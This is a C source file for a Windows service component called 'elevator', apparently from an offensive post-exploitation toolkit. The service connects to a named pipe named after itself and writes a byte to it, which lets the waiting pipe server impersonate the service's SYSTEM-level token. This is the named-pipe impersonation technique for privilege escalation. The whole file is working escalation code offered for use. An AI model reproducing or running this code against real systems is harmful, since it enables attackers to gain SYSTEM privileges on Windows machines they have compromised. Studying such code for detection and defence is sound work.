#include "elevator.h"
#include "namedpipeservice.h"

LPSTR lpServiceName           = NULL;
SERVICE_STATUS_HANDLE hStatus = NULL; 
HANDLE hTerminate             = NULL;
SERVICE_STATUS status         = {0}; 
DWORD dwElevateStatus         = 0;

BOOL elevator_servicestatus( DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint )
{
	BOOL bSuccess             = FALSE;
    static DWORD dwCheckPoint = 1;

	do
	{
		if( !hStatus )
			break;

		status.dwCurrentState = dwCurrentState;
		status.dwWin32ExitCode = dwWin32ExitCode;
		status.dwWaitHint = dwWaitHint;

		if( dwCurrentState == SERVICE_START_PENDING )
			status.dwControlsAccepted = 0;
		else
			status.dwControlsAccepted = SERVICE_ACCEPT_STOP;

		if( ( dwCurrentState == SERVICE_RUNNING ) || ( dwCurrentState == SERVICE_STOPPED ) )
			status.dwCheckPoint = 0;
		else
			status.dwCheckPoint = dwCheckPoint++;

		bSuccess = SetServiceStatus( hStatus, &status );

	} while( 0 );

	return bSuccess;
}

void elevator_servicectrl( DWORD dwCode ) { }

/*
 * The main service routine, which we use to connect a named pipe server before finishing.
 */
VOID elevator_serviceproc( DWORD argc, LPSTR * argv )
{
	DWORD dwResult              = ERROR_SUCCESS;
	HANDLE hPipe                = NULL;
	char cServicePipe[MAX_PATH] = {0};
	DWORD dwBytes               = 0;
	BYTE bByte                  = 0;

	do
	{

		hStatus = RegisterServiceCtrlHandler( lpServiceName, (LPHANDLER_FUNCTION)elevator_servicectrl );
		if( !hStatus )
			BREAK_ON_ERROR( "[ELAVATOR] elevator_service_proc. RegisterServiceCtrlHandler failed" );
		  
		status.dwServiceType             = SERVICE_WIN32_OWN_PROCESS; 
		status.dwServiceSpecificExitCode = 0;
		
		elevator_servicestatus( SERVICE_RUNNING, NO_ERROR, 0 );

		_snprintf( cServicePipe, MAX_PATH, "\\\\.\\pipe\\%s", lpServiceName );

		while( TRUE )
		{
			hPipe = CreateFileA( cServicePipe, GENERIC_ALL, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
			if( hPipe )
			{
				if( WriteFile( hPipe, &bByte, 1, &dwBytes, NULL ) )
					break;

				CLOSE_HANDLE( hPipe );
			}

			Sleep( 50 );
		}

	} while( 0 );

	CLOSE_HANDLE( hPipe );

	dwElevateStatus = dwResult;

	elevator_servicestatus( SERVICE_STOPPED, NO_ERROR, 0 );
	
	SetEvent( hTerminate );
}

/*
 * Elevate a pipe server by allowing it to impersonate us.
 */
BOOL elevator_namedpipeservice( char * cpServiceName )
{
	DWORD dwResult                      = ERROR_SUCCESS;
	SERVICE_TABLE_ENTRY servicetable[2] = {0};

	do
	{
		if( !cpServiceName )
			BREAK_WITH_ERROR( "[ELEVATOR] elevator_pipe. cpServiceName == NULL", ERROR_INVALID_HANDLE );
		
		lpServiceName = _strdup( cpServiceName );
	
		hTerminate = CreateEvent( 0, TRUE, FALSE, 0 );
		if( !hTerminate )
			BREAK_ON_ERROR( "[ELAVATOR] elevator_service_proc. CreateEvent hTerminate failed" );

		servicetable[0].lpServiceName = lpServiceName;
		servicetable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)elevator_serviceproc;

		servicetable[1].lpServiceName = NULL;
		servicetable[1].lpServiceProc = NULL;

		if( !StartServiceCtrlDispatcher( servicetable ) )
			BREAK_ON_ERROR( "[ELEVATOR] elevator_pipe. StartServiceCtrlDispatcher failed" );

		if( WaitForSingleObject( hTerminate, INFINITE ) != WAIT_OBJECT_0 )
			BREAK_ON_ERROR( "[ELEVATOR] elevator_pipe. WaitForSingleObject failed" );

		dwResult = dwElevateStatus;

	} while( 0 );
	
	CLOSE_HANDLE( hTerminate );

	return dwResult;
}
